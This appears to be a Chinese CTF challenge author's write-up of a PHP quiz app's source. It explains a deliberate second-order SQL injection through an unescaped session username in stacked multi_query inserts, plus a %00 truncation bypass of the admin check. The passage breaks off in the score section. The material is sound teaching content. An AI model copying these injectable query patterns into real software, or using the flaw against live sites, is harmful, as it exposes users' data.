<img src="/article/eruditeFlower/image-20220718194810642.png" class="" title="image-20220718194810642" loading="lazy">

<img src="/article/eruditeFlower/image-20220718194821729.png" class="" title="image-20220718194821729" loading="lazy">

<h4 id="register"><a href="#register" class="headerlink" title="register"></a>register</h4><p>按流程首先看看注册</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'studentid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'你想干啥？'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">''</span> <span class="token operator">||</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'studentid'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">''</span> <span class="token operator">||</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token string single-quoted-string">'提交'</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"搞事搞事搞事.jpg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token operator">...</span><span class="token operator">...</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>如果post了<code>username</code>和<code>studentid</code>那么就进入了注册流程，判断<code>$username===&#39;admin&#39;</code>，这里有个小插曲，原先写的是<code>==</code>导致可以直接%00截断，这个问题在下面会说</p>
<p>然后就是注册流程了</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">connect_errno</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"something err0r!&lt;br>姓名或学号重复"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>结合一下<code>init.sql</code>文件看一下</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token identifier"><span class="token punctuation">`</span>users<span class="token punctuation">`</span></span> <span class="token punctuation">(</span>
  <span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token keyword">unsigned</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">AUTO_INCREMENT</span><span class="token punctuation">,</span>
  <span class="token identifier"><span class="token punctuation">`</span>username<span class="token punctuation">`</span></span> <span class="token keyword">mediumtext</span><span class="token punctuation">,</span>
  <span class="token identifier"><span class="token punctuation">`</span>studentid<span class="token punctuation">`</span></span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
  <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span><span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token keyword">UNIQUE</span> <span class="token keyword">KEY</span> <span class="token identifier"><span class="token punctuation">`</span>studentid<span class="token punctuation">`</span></span> <span class="token punctuation">(</span><span class="token identifier"><span class="token punctuation">`</span>studentid<span class="token punctuation">`</span></span><span class="token punctuation">)</span>
<span class="token punctuation">)</span> <span class="token keyword">ENGINE</span><span class="token operator">=</span><span class="token keyword">InnoDB</span> <span class="token keyword">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">11</span> <span class="token keyword">DEFAULT</span> <span class="token keyword">CHARSET</span><span class="token operator">=</span>utf8<span class="token punctuation">;</span></code></pre>

<p>可以看到在.sql文件中<code>studentid</code>是唯一的，所以重复就会报错</p>
<p>接下来就是注册了，配合注释食用～</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">// 在插入前先查一下users表是否有此$studentid</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select * from users where studentid='<span class="token interpolation"><span class="token variable">$studentid</span></span>'"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// $result->num_rows如果有任何值，那就表示重复了</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert(\"用户已存在\");&lt;/script>"</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 这里是选题操作，首先count一下题库数量，然后随机选5道题目出来</span>
    <span class="token variable">$arrend</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select count(*) from challengesAll"</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">fetch_row</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">getRandom</span><span class="token punctuation">(</span><span class="token variable">$arrend</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 两句insert堆叠，由于$username和$studentid都经过转义处理了，所以不会存在注入的情况发生，当然 真的吗？</span>
    <span class="token comment">// 这一句是插入用户</span>
    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into users values (NULL, '<span class="token interpolation"><span class="token variable">$username</span></span>', '<span class="token interpolation"><span class="token variable">$studentid</span></span>');"</span><span class="token punctuation">;</span>
    <span class="token comment">// 这一句是插入用户和随机到的题目，每个用户题目是在注册的同时就选定好并插入到randChallenges表中的</span>
    <span class="token variable">$query</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"insert into randChallenges values (NULL, '<span class="token interpolation"><span class="token variable">$username</span></span>', '<span class="token interpolation"><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></span>', '<span class="token interpolation"><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span></span>', '<span class="token interpolation"><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span></span>', '<span class="token interpolation"><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span></span>', '<span class="token interpolation"><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span></span>');"</span><span class="token punctuation">;</span>
    <span class="token comment">// 成功后跳转login界面</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">multi_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">TRUE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"something error！"</span><span class="token operator">.</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h4 id="login"><a href="#login" class="headerlink" title="login"></a>login</h4><p>还是一样，首先判断是否登录，登录过了就跳回主界面，post俩参数就进入登录流程，配合注释食用～</p>
<pre class="language-php" data-language="php"><code class="language-php">
<span class="token comment">// 经典登录语句，$username和$studentid都经过了addslashes_deep转义</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select * from users where username='<span class="token interpolation"><span class="token variable">$username</span></span>' and studentid='<span class="token interpolation"><span class="token variable">$studentid</span></span>'"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span> <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">,</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'studentid'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'studentid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		
    <span class="token comment">// 如果登录了admin就重置admin密码，这里在下方还会再讲</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token variable">$random</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"update users set studentid='<span class="token interpolation"><span class="token variable">$random</span></span>' where username='admin'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"用户名或密码错误 QAQ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h4 id="index"><a href="#index" class="headerlink" title="index"></a>index</h4><p>下面就是最大头的index部分了</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token delimiter important">?></span></span>
  // 如果登录就给出登出按钮
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui--appbar-height<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logout.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>登出<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>
  <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
  <span class="token comment">// 如果是admin就给出单独查成绩的界面</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span> <span class="token delimiter important">?></span></span>
    查询<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui--appbar-height<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>score.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>成绩<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>或<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui--appbar-height<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>rank.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>排名<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>
    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token comment">// 并且不再继续往下</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                       <span class="token punctuation">&#125;</span>
<span class="token keyword">endif</span><span class="token punctuation">;</span>
<span class="token comment">// 下面是普通用户的流程</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$mysqli</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token constant">MYSQL_HOST</span><span class="token punctuation">,</span> <span class="token constant">MYSQL_USER</span><span class="token punctuation">,</span> <span class="token constant">MYSQL_PASSWORD</span><span class="token punctuation">,</span> <span class="token constant">MYSQL_DATABASE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"set names utf8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 检查score表是否有分了，有分就表示做过了</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select * from score where username='"</span><span class="token operator">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span> <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token delimiter important">?></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span>您已完成测试<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span>查询<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui--appbar-height<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>score.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>成绩<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>或<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui--appbar-height<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>rank.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>排名<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>
    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                              <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token operator">...</span><span class="token operator">...</span>
  
<span class="token operator">&lt;</span><span class="token operator">?</span>php <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token delimiter important">?></span></span>
  // 没登录展示如下
  请先<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui--appbar-height<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>login.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 登陆<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>
  或<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui--appbar-height<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>register.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 注册<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
  查询<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui--appbar-height<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>score.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>成绩<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>或<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui--appbar-height<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>rank.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>排名<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>
  <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">endif</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></code></pre>

<p>接着就是没做过题的普通用户流程，一段联合查询语句查出该用户抽的题目并从题库challengesAll中抽出这些题目再展示</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT
  type,Title,TitleImg,OptionA,OptionB,OptionC,OptionD
  FROM
  challengesAll,randChallenges 
  WHERE
  randChallenges.username = '"</span><span class="token operator">.</span><span class="token function">addslashes_deep</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"'
  AND (challengesAll.id = randChallenges.challengeId1 
       OR challengesAll.id = randChallenges.challengeId2 
       OR challengesAll.id = randChallenges.challengeId3 
       OR challengesAll.id = randChallenges.challengeId4 
       OR challengesAll.id = randChallenges.challengeId5)"</span><span class="token punctuation">)</span> <span class="token comment">// 很蹩脚的查询</span></code></pre>

<p>接着解析，单选题和判断题有不同的展示方式，到目前为止都很正常。</p>
<p>下面就是判分了，原先这里没做判断，应该增加判断q1-5是否合法，防止直接在选项处就开始注入从而跳过考点了，这就是为什么有的师傅会疑问为什么有二次注入考点的问题。</p>
<p>然后就是出现问题的地方了，通过审计可以发现在$query的第二句<code>$_SESSION[&#39;username&#39;]</code>没有做转义，而在login处可以发现<code>$_SESSION[&#39;username&#39;]==($row[&#39;username&#39;])</code>如此一来我们存入数据库的username被提取出来，然后未经过转义就再次插入到了sql语句中，从而造成了二次注入的漏洞。</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">// 先查一下是否已经完成过测试，防止一个用户有多条结果</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select * from score where username='"</span><span class="token operator">.</span><span class="token function">addslashes_deep</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert(\"用户已完成测试\");&lt;/script>"</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 可以看到在第二句中$_SESSION['username</span><span class="token string single-quoted-string">']未做转义
    // 这里q1-5后续增加了合法性判断
    $query = "insert into score values (NULL, '</span><span class="token string double-quoted-string">".addslashes_deep(<span class="token interpolation"><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span></span>)."</span><span class="token string single-quoted-string">', $getscroe);
            insert into userAnswer values (NULL, '</span><span class="token string double-quoted-string">".<span class="token interpolation"><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span></span>."</span><span class="token string single-quoted-string">', '</span><span class="token string double-quoted-string">".<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q1'</span><span class="token punctuation">]</span></span>."</span><span class="token string single-quoted-string">', '</span><span class="token string double-quoted-string">".<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q2'</span><span class="token punctuation">]</span></span>."</span><span class="token string single-quoted-string">', '</span><span class="token string double-quoted-string">".<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q3'</span><span class="token punctuation">]</span></span>."</span><span class="token string single-quoted-string">', '</span><span class="token string double-quoted-string">".<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q4'</span><span class="token punctuation">]</span></span>."</span><span class="token string single-quoted-string">', '</span><span class="token string double-quoted-string">".<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q5'</span><span class="token punctuation">]</span></span>."</span><span class="token string single-quoted-string">')";
    //            var_dump($query);
    //            exit(1);
    if ($mysqli->multi_query($query)===TRUE) &#123;
      $mysqli->close();
      echo "&lt;script>alert(\"已完成测试！\");&lt;/script>";
      echo "&lt;script language='</span>JavaScript<span class="token string single-quoted-string">'>location.replace('</span>index<span class="token operator">.</span>php'<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token string double-quoted-string">";
    &#125; else &#123;
      exit("</span>something err0r！"<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h4 id="score"><a href="#score" class="headerlink" title="score"></a>score</h4><p>获取了admin我们就可以查询对应用户的成绩了</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'studentid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token comment">// 对传入studentid转义，没啥问题</span>
